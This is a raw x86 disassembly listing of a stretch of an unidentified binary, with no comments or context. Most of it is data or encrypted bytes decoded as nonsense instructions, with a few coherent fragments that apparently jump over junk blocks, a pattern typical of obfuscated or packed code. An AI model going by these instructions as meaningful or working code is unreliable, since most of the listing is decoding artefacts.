  40f083:	jecxz  0x40f007
  40f085:	in     eax,dx
  40f086:	xchg   edx,eax
  40f087:	ja     0x40f101
  40f089:	mov    edx,0xfada0dd4
  40f08e:	jbe    0x40f032
  40f090:	ja     0x40f100
  40f092:	in     al,0x26
  40f094:	and    ah,BYTE PTR [edx+0x41]
  40f097:	jg     0x40f034
  40f099:	mov    bl,0x46
  40f09b:	pop    ebx
  40f09c:	call   0x2968:0x94e39f12
  40f0a3:	xchg   ecx,eax
  40f0a4:	inc    BYTE PTR [ebx+0x18]
  40f0a7:	sub    BYTE PTR [ecx+0x7a911276],cl
  40f0ad:	retf   
  40f0ae:	or     bl,BYTE PTR [eax-0x2ef0a39b]
  40f0b4:	in     al,dx
  40f0b5:	dec    esi
  40f0b6:	adc    al,0x66
  40f0b8:	sbb    DWORD PTR [edx],ebp
  40f0ba:	jbe    0x40f116
  40f0bc:	loopne 0x40f091
  40f0be:	in     al,dx
  40f0bf:	dec    esi
  40f0c0:	out    0xa6,eax
  40f0c2:	xchg   ebx,eax
  40f0c3:	stc    
  40f0c4:	bound  ebp,QWORD PTR [edi]
  40f0c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0c7:	std    
  40f0c8:	mov    bl,0xe4
  40f0ca:	pop    ss
  40f0cb:	sar    BYTE PTR [esi+0x4eb9fb11],0x99
  40f0d2:	dec    edx
  40f0d3:	inc    ecx
  40f0d4:	or     ch,BYTE PTR [edi-0x536d1c9d]
  40f0da:	mov    DWORD PTR [ebx],edx
  40f0dc:	ret    0x42fd
  40f0df:	inc    edi
  40f0e0:	cmp    edx,edx
  40f0e2:	add    DWORD PTR [bx+si],esi
  40f0e5:	mov    edx,0x6ba3c47d
  40f0ea:	ins    BYTE PTR es:[edi],dx
  40f0eb:	es ret 
  40f0ed:	leave  
  40f0ee:	and    ebp,eax
  40f0f0:	push   ds
  40f0f1:	dec    ecx
  40f0f2:	pop    ebx
  40f0f3:	or     al,0x8f
  40f0f5:	sar    DWORD PTR [ecx+0x35],1
  40f0f8:	sar    BYTE PTR [edi+ecx*8+0x57a3a6d9],0x7c
  40f100:	mov    edx,0xf1a371ac
  40f105:	into   
  40f106:	mov    edi,0x7b8b1810
  40f10b:	inc    ebx
  40f10c:	xchg   ebx,eax
  40f10d:	adc    edx,0x3ac914b5
  40f113:	popa   
  40f114:	mov    cl,0xb
  40f116:	clc    
  40f117:	cmp    ch,dh
  40f119:	adc    ah,BYTE PTR [ebx]
  40f11b:	inc    ebx
  40f11c:	or     ebp,DWORD PTR [eax]
  40f11e:	and    dl,BYTE PTR [edx]
  40f120:	dec    eax
  40f121:	or     bl,BYTE PTR [ebx]
  40f123:	push   ebp
  40f124:	add    DWORD PTR [edi+0x25],ebx
  40f127:	xchg   edi,eax
  40f128:	out    0x8e,al
  40f12a:	ins    BYTE PTR es:[edi],dx
  40f12b:	(bad)  
  40f12c:	and    al,0x1
  40f12e:	lods   al,BYTE PTR ds:[esi]
  40f12f:	popf   
  40f130:	mov    edi,0x2f819bca
  40f135:	jns    0x40f162
  40f137:	jmp    0x3e75fcb7
  40f13c:	mov    WORD PTR [edi+0x77],?
  40f13f:	ret    
  40f140:	xlat   BYTE PTR ds:[ebx]
  40f141:	and    ebx,DWORD PTR [eax+0x65ddf752]
  40f147:	ins    BYTE PTR es:[edi],dx
  40f148:	pop    ecx
  40f149:	push   edx
  40f14a:	in     eax,0x31
  40f14c:	adc    ah,BYTE PTR [esi+0x475c5251]
  40f152:	ror    BYTE PTR [edi],0x84
  40f155:	js     0x40f158
  40f157:	add    BYTE PTR [eax],al
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR [edi+0x78],edx
  40f16f:	ret    
  40f170:	icebp  
  40f171:	mov    ds:0xc37070aa,eax
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f152
  40f17a:	adc    ch,BYTE PTR [ecx]
  40f17c:	xchg   ebx,eax
  40f17d:	jp     0x40f1de
  40f17f:	rcr    BYTE PTR [edx+0x1f9c8cd9],0xdd
  40f186:	or     BYTE PTR [edi+ebx*1-0xa],ch
  40f18a:	xchg   BYTE PTR [edx+esi*2-0x7995180e],ah
  40f191:	mov    ds:0xe63b8497,al
  40f196:	inc    eax
  40f197:	jp     0x40f127
  40f199:	cli    
  40f19a:	dec    ebx
  40f19b:	pop    edi
  40f19c:	outs   dx,BYTE PTR ds:[esi]
  40f19d:	out    dx,al
  40f19e:	xchg   edx,eax
  40f19f:	fwait
  40f1a0:	daa    
  40f1a1:	jmp    0x4d80:0x1086e17
  40f1a8:	jl     0x40f18d
  40f1aa:	dec    edx
  40f1ab:	fisub  DWORD PTR [ebp-0xc]
  40f1ae:	pusha  
  40f1af:	data16 out dx,al
  40f1b1:	retf   0x7bd2
  40f1b4:	mov    dh,0x60
  40f1b6:	mov    bl,0xa9
  40f1b8:	pop    ebp
  40f1b9:	cmp    eax,0x69974fa7
  40f1be:	mov    esi,0xddc593b7
  40f1c3:	sar    BYTE PTR [ebx+0xd29ba76],cl
  40f1c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1ca:	repnz xchg esi,eax
  40f1cc:	push   0x14
  40f1ce:	(bad)  [ebp-0x7f]
  40f1d1:	inc    ebp
  40f1d2:	sub    al,0xa1
  40f1d4:	ja     0x40f213
  40f1d6:	ret    0xb7e5
  40f1d9:	popa   
  40f1da:	scas   eax,DWORD PTR es:[edi]
  40f1db:	jl     0x40f1f6
  40f1dd:	adc    eax,0x9e1dc52f
  40f1e2:	aaa    
  40f1e3:	retf   0xf768
  40f1e6:	les    ebp,FWORD PTR ds:0x5f459fc8
  40f1ec:	arpl   bp,sp
  40f1ee:	cld    
  40f1ef:	push   esi
  40f1f0:	adc    cl,cl
  40f1f2:	xor    eax,edi
  40f1f4:	cmp    al,0xe
  40f1f6:	out    0x70,al
  40f1f8:	adc    eax,0x30a8b97a
  40f1fd:	pop    ebx
  40f1fe:	or     BYTE PTR [edi],dh
  40f200:	in     eax,0x23
  40f202:	xchg   ebx,eax
  40f203:	sub    al,0xc4
  40f205:	std    
  40f206:	pop    eax
  40f207:	adc    eax,DWORD PTR [ebp+0xa9500d1]
  40f20d:	jne    0x40f267
  40f20f:	pusha  
  40f210:	inc    ebp
  40f211:	ret    0x2699
  40f214:	dec    ebp
  40f215:	arpl   si,dx
  40f217:	outs   dx,DWORD PTR ds:[esi]
  40f218:	pop    esi
  40f219:	xor    eax,0xa6904bf
  40f21e:	adc    eax,0x18d8be63
  40f223:	sub    al,0x1c
  40f225:	sbb    DWORD PTR [edx],edx
  40f227:	mov    edi,0x7a267454
  40f22c:	add    edx,esp
  40f22e:	xor    al,0x9d
  40f230:	or     ch,cl
  40f232:	(bad)  
  40f234:	daa    
  40f235:	and    dh,BYTE PTR [eax]
  40f237:	mov    edi,0xf5137e8f
  40f23c:	dec    esi
  40f23d:	push   ss
  40f23e:	repnz xchg ebx,eax
  40f240:	(bad)  
  40f241:	push   ecx
  40f242:	mov    cl,0xa9
  40f244:	xchg   ebp,eax
  40f245:	inc    ebx
  40f246:	sub    eax,0x9ddec844
  40f24b:	inc    esi
  40f24c:	mov    bh,0x18
  40f24e:	or     DWORD PTR [ecx-0x5b],ebx
  40f251:	loopne 0x40f1f8
  40f253:	ret    0x7978
  40f256:	fwait
  40f257:	iret   
  40f258:	outs   dx,BYTE PTR ds:[esi]
  40f259:	jbe    0x40f21a
  40f25b:	into   
  40f25c:	js     0x40f1e7
  40f25e:	push   edi
  40f25f:	(bad)  
  40f260:	loopne 0x40f25e
  40f262:	mov    gs,WORD PTR [edi]
  40f264:	retf   0x1e44
  40f267:	popa   
  40f268:	inc    edx
  40f269:	pop    es
  40f26a:	jge    0x40f27b
  40f26c:	lds    ecx,FWORD PTR [eax]
  40f26e:	xchg   BYTE PTR [ecx+0x36],dl
  40f271:	sahf   
  40f272:	int3   
  40f273:	sub    DWORD PTR [edx+0x6bacb3cd],edx
  40f279:	mov    ebp,0xcbe077b4
  40f27e:	inc    ecx
  40f27f:	mov    bh,0x76
  40f281:	call   0x5324:0xfebd5876
  40f288:	mov    edi,0xdcd44fdf
  40f28d:	repnz (bad) 
  40f28f:	mov    ch,0xf2
  40f291:	push   ds
  40f292:	rcr    BYTE PTR [edx],0x6f
  40f295:	addr16 into 
  40f297:	imul   BYTE PTR ds:0x793db45a
  40f29d:	push   ebx
  40f29e:	or     eax,0x980b419
  40f2a3:	sub    BYTE PTR [esp-0x4fc2463e],dl
  40f2aa:	outs   dx,BYTE PTR ds:[esi]
  40f2ab:	outs   dx,DWORD PTR ds:[esi]
  40f2ac:	inc    ebp
  40f2ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2ae:	out    0xf9,eax
  40f2b0:	cmp    eax,0xdb195ac4
  40f2b5:	or     BYTE PTR [eax-0x27],bl
  40f2b8:	sbb    BYTE PTR [ebp-0x1418a280],bh
  40f2be:	pop    eax
  40f2bf:	or     eax,0xffc42906
  40f2c4:	repz mov edi,0x341e8900
  40f2cb:	pusha  
  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	ror    BYTE PTR [edi+0x768c95f1],1
  40f2fc:	test   eax,0x7fc37070
  40f301:	jo     0x40f373
  40f303:	cld    
  40f304:	mov    ecx,0x6be3e872
  40f309:	mov    ch,0x1d
  40f30b:	push   edx
  40f30c:	je     0x40f35e
  40f30e:	(bad)  [edi+0x66682a6b]
  40f314:	outs   dx,BYTE PTR ds:[esi]
  40f315:	fldcw  WORD PTR [esp+edx*2+0x17d1b7ed]
  40f31c:	retf   0xab74
  40f31f:	mov    bl,0x25
  40f321:	in     al,0x6b
  40f323:	sub    BYTE PTR [ebp-0x73],bl
  40f326:	dec    ebp
  40f327:	jae    0x40f2f5
  40f329:	pop    ebx
  40f32a:	adc    DWORD PTR [ebx+0x3b3ff88f],edi
  40f330:	jg     0x40f3a6
  40f332:	mov    esp,0x597e437a
  40f337:	test   BYTE PTR es:[ebx+0x15],bh
  40f33b:	ret    0xc20
  40f33e:	or     BYTE PTR [ecx+0x5d],0x2
  40f342:	ret    
  40f343:	sub    DWORD PTR [eax],ecx
  40f345:	mov    ch,bh
  40f347:	add    BYTE PTR [edx-0x4acd431f],cl
  40f34d:	mov    edi,0x2ac8c25d
  40f352:	fwait
  40f353:	cmc    
  40f354:	fisub  DWORD PTR [ebx-0x21]
  40f357:	pop    esi
  40f358:	dec    ebx
  40f359:	not    BYTE PTR [edx]
  40f35b:	mov    bh,0x4f
  40f35d:	sub    ch,BYTE PTR [eax+0x3cda3952]
  40f363:	mov    dh,0xa1
  40f365:	cmp    DWORD PTR [ebp-0x4ee9c6ad],0xffffffef
  40f36c:	push   ebx
  40f36d:	xor    BYTE PTR [esi+0x553826c3],bh
  40f373:	xor    esp,edx
  40f375:	inc    edx
  40f376:	mov    dl,0x96
  40f378:	(bad)  
  40f379:	scas   al,BYTE PTR es:[edi]
  40f37a:	pop    edx
  40f37b:	pushf  
  40f37c:	jecxz  0x40f3dd
  40f37e:	cmp    bh,ch
  40f380:	test   al,0xd3
  40f382:	jge    0x40f398
  40f384:	pop    es
  40f385:	jne    0x40f36e
  40f387:	nop
  40f388:	enter  0x1eae,0xeb
  40f38c:	dec    edx
  40f38d:	sti    
  40f38e:	mov    al,0x52
  40f390:	out    0xcc,al
  40f392:	inc    ebx
  40f393:	and    BYTE PTR [edi+esi*1+0x2877162d],ah
  40f39a:	sub    al,0x2e
  40f39c:	call   0xf97d6e06
  40f3a1:	fcmovnbe st,st(6)
  40f3a3:	jle    0x40f3f7
  40f3a5:	jnp    0x40f39c
  40f3a7:	sub    al,0x65
  40f3a9:	jb     0x40f3b2
  40f3ab:	fild   DWORD PTR [esi+0x3d77a3a8]
  40f3b1:	iret   
  40f3b2:	in     eax,dx
  40f3b3:	push   esp
  40f3b4:	test   BYTE PTR [esi],al
  40f3b6:	std    
  40f3b7:	mov    ?,WORD PTR [ecx]
  40f3b9:	(bad)  
  40f3ba:	or     ecx,DWORD PTR [eax+eax*4+0x3c]
  40f3be:	xchg   ecx,eax
  40f3bf:	sbb    esi,esi
  40f3c1:	lods   eax,DWORD PTR ds:[esi]
  40f3c2:	stos   DWORD PTR es:[edi],eax
  40f3c3:	(bad)  
  40f3c5:	dec    edx
  40f3c6:	scas   eax,DWORD PTR es:[edi]
  40f3c7:	cdq    
  40f3c8:	andnps xmm7,XMMWORD PTR [ebp+0x5a353e09]
  40f3cf:	jne    0x40f44a
  40f3d1:	(bad)  
  40f3d5:	fstp   DWORD PTR [eax]
  40f3d7:	(bad)  
  40f3d8:	xor    DWORD PTR [ecx],0xf79127d3
  40f3de:	iret   
  40f3df:	mov    eax,DWORD PTR [eax+ebp*2+0x0]
  40f3e3:	aad    0xdc
  40f3e5:	dec    esi
  40f3e6:	cmp    al,0xb8
  40f3e8:	pop    ebp
  40f3e9:	mov    ebx,0xdbad3cae
  40f3ee:	das    
  40f3ef:	in     al,dx
  40f3f0:	or     ah,bl
  40f3f2:	dec    ebx
  40f3f3:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40f3f5:	sahf   
  40f3f6:	sub    eax,DWORD PTR [esi+ecx*4]
  40f3f9:	inc    ecx
  40f3fa:	xchg   ecx,eax
  40f3fb:	push   ebp
  40f3fd:	pop    ebx
  40f3fe:	vmptrst QWORD PTR [edi]
  40f401:	pop    ebx
  40f402:	dec    ebp
  40f403:	retf   0xdd67
  40f406:	repnz in al,dx
  40f408:	or     edi,DWORD PTR [ebx+ecx*4]
  40f40b:	pop    esi
  40f40c:	pusha  
  40f40d:	jge    0x40f43a
  40f40f:	mov    dl,0xf4
  40f411:	ret    
  40f412:	ret    0xc250
  40f415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f416:	mov    ah,0xd6
  40f418:	sbb    eax,0x6fca3630
  40f41d:	cli    
  40f41e:	pop    es
  40f41f:	test   eax,0x1f61ccd
  40f424:	fwait
  40f425:	into   
  40f426:	pop    ebp
  40f427:	sbb    BYTE PTR [eax+0xf],cl
  40f42a:	and    dl,bl
  40f42c:	pop    ds
  40f42d:	ja     0x40f43a
  40f42f:	inc    esi
  40f430:	scas   eax,DWORD PTR es:[edi]
  40f431:	hlt    
  40f432:	xor    ebp,DWORD PTR [edi+0x39]
  40f435:	and    bh,bl
  40f437:	add    eax,0x374103e4
  40f43c:	sbb    bh,BYTE PTR [ebp+0x41938fb8]
  40f442:	jae    0x40f41f
  40f444:	sar    BYTE PTR [edi+0x7dc91e48],0xc6
  40f44b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f44c:	cs inc ecx
  40f44e:	cmp    al,0xf2
  40f450:	mov    eax,DWORD PTR [ebp-0x8]
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	jle    0x40f4e3
  40f466:	ret    
  40f467:	jmp    0x40f4a2
  40f469:	mov    bh,0x70
  40f46b:	jo     0x40f430
  40f46d:	jg     0x40f4df
  40f46f:	jo     0x40f4b8
  40f471:	or     DWORD PTR [eax-0x657e04f5],edx
  40f477:	pop    edx
  40f478:	mov    bh,0x1
  40f47a:	outs   dx,BYTE PTR ds:[esi]
  40f47b:	sub    DWORD PTR [esi],esp
  40f47d:	icebp  
  40f47e:	and    BYTE PTR [eax],dl
  40f480:	pop    ds
  40f481:	into   
  40f482:	icebp  
  40f483:	adc    bl,dl
  40f485:	and    ah,ch
  40f487:	cs dec edx
  40f489:	bound  ebx,QWORD PTR [edx-0x2414a734]
  40f48f:	cmp    edx,edx
  40f491:	xor    al,0x45
  40f493:	outs   dx,DWORD PTR ds:[esi]
  40f494:	pop    ecx
  40f495:	test   eax,0xab722233
  40f49a:	and    eax,0x682c422b
  40f49f:	fist   WORD PTR [ecx]
  40f4a1:	jmp    0x7a15:0x2e9266dc
  40f4a8:	jne    0x40f4c5
  40f4aa:	push   eax
  40f4ab:	adc    BYTE PTR [esi+0x53],dl
  40f4ae:	scas   al,BYTE PTR es:[edi]
  40f4af:	sub    dh,BYTE PTR [edi+edi*4+0x5]
  40f4b3:	hlt    
  40f4b4:	mov    ds:0xd486f902,eax
  40f4b9:	sahf   
  40f4ba:	(bad)  
  40f4bb:	fsub   DWORD PTR [ebp+0x20e23347]
  40f4c1:	mov    ebx,0xb1998684
  40f4c6:	sub    eax,0x8606cc9a
  40f4cb:	mov    ds:0xb5ef7d79,al
  40f4d0:	test   eax,0xab530419
  40f4d5:	adc    BYTE PTR [ebp+0x786b77e0],bl
  40f4db:	adc    BYTE PTR [ecx],0xfe
  40f4de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4df:	bound  ebx,QWORD PTR [edx+edx*2]
  40f4e2:	enter  0xf813,0xeb
  40f4e6:	sub    edi,DWORD PTR [ebp+0x1]
  40f4e9:	dec    ebx
  40f4ea:	pop    ebp
  40f4eb:	ins    BYTE PTR es:[edi],dx
  40f4ec:	jmp    0x40f4b1
  40f4ee:	int3   
  40f4ef:	jae    0x40f515
  40f4f1:	es out dx,al
  40f4f3:	pop    ss
  40f4f4:	iret   
  40f4f5:	mov    edx,0xe3ba8eea
  40f4fa:	iret   
  40f4fb:	mov    ebx,0x79b137ec
  40f500:	fcom   QWORD PTR [esi+0x61]
  40f503:	fadd   QWORD PTR [edi+0x1faf637a]
  40f509:	jo     0x40f4b3
  40f50b:	mov    DWORD PTR [eax+0x21597846],ebp
  40f511:	xchg   edi,eax
  40f512:	les    esp,FWORD PTR [edi+0x6181d16b]
  40f518:	cwde   
  40f519:	loopne 0x40f4f3
  40f51b:	xchg   esp,eax
  40f51c:	sub    dh,cl
  40f51e:	pop    ebp
  40f51f:	or     eax,esp
  40f521:	jb     0x40f575
  40f523:	xchg   DWORD PTR ds:0xf20a70cf,ebx
  40f529:	mov    al,0x60
  40f52b:	pop    ebp
  40f52c:	(bad)  
  40f52d:	out    0x6b,eax
  40f52f:	fist   DWORD PTR [ebx+0x63]
  40f532:	call   0xc71b:0x49992454
  40f539:	mov    bh,0x90
  40f53b:	mov    ah,0x7f
  40f53d:	pminub mm6,mm2
  40f540:	test   DWORD PTR [edi-0x5a4cbf52],0x65245c5e
  40f54a:	mov    ch,0x38
  40f54c:	(bad)  
  40f54d:	mov    al,0xd
  40f54f:	fcmove st,st(2)
  40f551:	das    
  40f552:	sub    BYTE PTR [esi],dh
  40f554:	(bad)  
  40f555:	in     al,dx
  40f556:	(bad)  
  40f557:	xchg   esp,eax
  40f558:	cld    
  40f559:	add    DWORD PTR [ebp+eax*8+0x40],ecx
  40f55d:	stos   BYTE PTR es:[di],al
  40f55f:	add    edi,DWORD PTR [edx+0x38]
  40f562:	jl     0x40f538
  40f564:	sub    eax,0x938596fd
  40f569:	(bad)  
  40f56a:	enter  0x9ecd,0x8d
  40f56e:	pop    ebx
  40f56f:	and    BYTE PTR [esi],0xb2
  40f572:	pop    ebx
  40f573:	xor    dh,BYTE PTR [esi-0x26149bda]
  40f579:	leave  
  40f57a:	lods   eax,DWORD PTR ds:[esi]
  40f57b:	pop    es
  40f57c:	cmp    eax,0xfdb2d745
  40f581:	gs adc al,0xdf
  40f584:	push   cs
  40f585:	fldcw  WORD PTR [esi+edi*4+0x59]
  40f589:	fs (bad) 
  40f58b:	iret   
  40f58c:	retf   0xdcc6
  40f58f:	addr16 xchg ecx,eax
  40f591:	cld    
  40f592:	sub    al,0xc9
  40f594:	dec    edi
  40f595:	aaa    
  40f596:	shl    BYTE PTR [ecx],0x3
  40f599:	jo     0x40f5c6
  40f59b:	mov    BYTE PTR [ebx-0x7140304f],ch
  40f5a1:	sbb    al,0x24
  40f5a3:	adc    esp,ebp
  40f5a5:	stc    
  40f5a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5a7:	xchg   dl,al
  40f5a9:	jnp    0x40f617
  40f5ab:	in     eax,0xb8
  40f5ad:	ret    0xd41f
  40f5b0:	mov    dl,0x4f
  40f5b2:	cdq    
  40f5b3:	inc    eax
  40f5b4:	jecxz  0x40f58a
  40f5b6:	out    0x13,eax
  40f5b8:	aam    0x29
  40f5ba:	gs ss cmp eax,0x408b008b
  40f5c1:	cmp    al,0x8d
  40f5c3:	or     al,0xcd
  40f5c5:	js     0x40f5c7
  40f5c7:	add    BYTE PTR [eax],al
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	xchg   ebp,eax
  40f604:	jno    0x40f610
  40f606:	hlt    
  40f607:	mov    WORD PTR [esi+0x7fc37070],?
  40f60d:	jo     0x40f67f
  40f60f:	call   0xde3a9363
  40f614:	arpl   dx,sp
  40f616:	pop    esp
  40f617:	stos   DWORD PTR es:[edi],eax
  40f618:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f61a:	in     al,dx
  40f61b:	scas   eax,DWORD PTR es:[edi]
  40f61c:	pop    esp
  40f61d:	cwde   
  40f61e:	add    edx,DWORD PTR [edx+0x615bb985]
  40f624:	outs   dx,BYTE PTR ds:[esi]
  40f625:	xor    al,0x65
  40f627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f628:	push   edi
  40f629:	xor    bl,ch
  40f62b:	mov    ah,0x55
  40f62d:	pop    es
  40f62e:	test   DWORD PTR ds:0x69bbae99,ebp
  40f634:	mov    esp,?
  40f636:	sti    
  40f637:	or     al,0x39
  40f639:	loop   0x40f606
  40f63b:	or     DWORD PTR [edx],eax
  40f63d:	sbb    esi,ecx
  40f63f:	shl    DWORD PTR [esi+0x4efd90d9],0x40
  40f646:	mov    gs,WORD PTR [ecx+0x4e61ff15]
  40f64c:	shl    BYTE PTR [edx],1
  40f64e:	(bad)  
  40f650:	fstp   DWORD PTR [ecx-0x33de9cfb]
  40f656:	lea    ebp,[esp+esi*8]
  40f659:	jge    0x40f683
  40f65b:	(bad)  [edi+0x4b]
  40f65e:	dec    ebp
  40f65f:	daa    
  40f660:	pop    ecx
  40f661:	push   cs
  40f662:	leave  
  40f663:	out    dx,al
  40f664:	mov    ch,0xe3
  40f666:	xchg   BYTE PTR [eax],al
  40f668:	push   eax
  40f669:	test   DWORD PTR [eax+0x49],ecx
  40f66c:	xchg   ecx,eax
  40f66d:	fnstenv [esi+0x3f]
  40f670:	pop    ss
  40f671:	xor    DWORD PTR [ebx-0x6520df],eax
  40f677:	cmp    eax,0xd368d512
  40f67c:	mov    ds:0x33aa3b03,al
  40f681:	daa    
  40f682:	xchg   DWORD PTR ds:0x7a6ba4e8,ecx
  40f688:	leave  
  40f689:	jmp    0xefb8:0x46f61550
  40f690:	inc    eax
  40f691:	mov    al,ds:0xc5252a13
  40f696:	sub    DWORD PTR [edi-0x61],esp
  40f699:	dec    ebx
  40f69a:	stos   BYTE PTR es:[edi],al
  40f69b:	stos   DWORD PTR es:[edi],eax
  40f69c:	pop    ecx
  40f69d:	sub    al,0x4b
  40f69f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6a0:	arpl   WORD PTR [ecx],sp
  40f6a2:	stos   DWORD PTR es:[edi],eax
  40f6a3:	and    eax,0x818dd6b2
  40f6a8:	xor    al,0x73
  40f6aa:	lock xchg BYTE PTR [edi+0x1db9c311],al
  40f6b1:	xor    eax,0xb5b90350
  40f6b6:	and    ebp,DWORD PTR [edi]
  40f6b8:	es daa 
  40f6ba:	xchg   BYTE PTR [ecx],dh
  40f6bc:	je     0x40f64c
  40f6be:	lods   al,BYTE PTR ds:[esi]
  40f6bf:	out    dx,eax
  40f6c0:	fwait
  40f6c1:	std    
  40f6c2:	gs loope 0x40f687
  40f6c5:	mov    eax,0x3baaee1f
  40f6ca:	sbb    DWORD PTR [edx],ecx
  40f6cc:	inc    esi
  40f6cd:	mov    dl,0x9f
  40f6cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6d0:	loope  0x40f682
  40f6d2:	in     al,0x35
  40f6d4:	fdivr  QWORD PTR [esi+0xff516ea]
  40f6da:	ficom  DWORD PTR ds:0xa42f941e
  40f6e0:	jp     0x40f6da
  40f6e2:	test   DWORD PTR [esp+ebx*4],edi
  40f6e5:	add    eax,DWORD PTR [edx-0x6ef376d]
  40f6eb:	lahf   
  40f6ec:	out    0x85,al
  40f6ee:	push   ebx
  40f6ef:	ffree  st(3)
  40f6f1:	push   eax
  40f6f2:	push   edi
  40f6f3:	push   0xb160aa66
  40f6f8:	ins    DWORD PTR es:[edi],dx
  40f6f9:	inc    esp
  40f6fa:	dec    esp
  40f6fb:	outs   dx,DWORD PTR ds:[esi]
  40f6fc:	aam    0x8a
  40f6fe:	rol    DWORD PTR [edi],0xf7
  40f701:	inc    esi
  40f702:	cmp    BYTE PTR [ebx],al
  40f704:	and    DWORD PTR [eax+0x2],0x3c67eb8d
  40f70b:	ret    
  40f70c:	mov    al,ds:0x8a9b1efb
  40f711:	mov    bl,0xe7
  40f713:	sub    esi,DWORD PTR [ecx+edx*2-0x43]
  40f717:	pop    ss
  40f718:	cdq    
  40f719:	sbb    ebp,DWORD PTR [ebp+0x2b]
  40f71c:	mov    eax,0xebd4e4dd
  40f721:	jp     0x40f6d5
  40f723:	call   0xaf9b:0x235d0ea1
  40f72a:	(bad)  
  40f72b:	pop    ebx
  40f72c:	test   DWORD PTR [edi+0x44],eax
  40f72f:	push   0xffffffc8
  40f731:	cmp    DWORD PTR [eax+ebp*4],ecx
  40f734:	sub    DWORD PTR [ebx],0x3fbfa0cc
  40f73a:	mov    dl,0xa4
  40f73c:	ins    BYTE PTR es:[edi],dx
  40f73d:	pop    ebp
  40f73e:	out    dx,al
  40f73f:	push   eax
  40f740:	mov    eax,0x296dbb92
  40f745:	lods   eax,DWORD PTR ds:[esi]
  40f746:	adc    al,0x43
  40f748:	jno    0x40f6ea
  40f74a:	in     eax,0xb4
  40f74c:	into   
  40f74d:	dec    ebx
  40f74e:	rol    BYTE PTR [ebx+0x1e35dc20],0x66
  40f755:	popf   
  40f756:	stos   BYTE PTR es:[edi],al
  40f757:	ins    DWORD PTR es:[edi],dx
  40f758:	dec    edx
  40f759:	inc    eax
  40f75a:	gs iret 
  40f75c:	mov    eax,DWORD PTR [ebp-0x8]
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
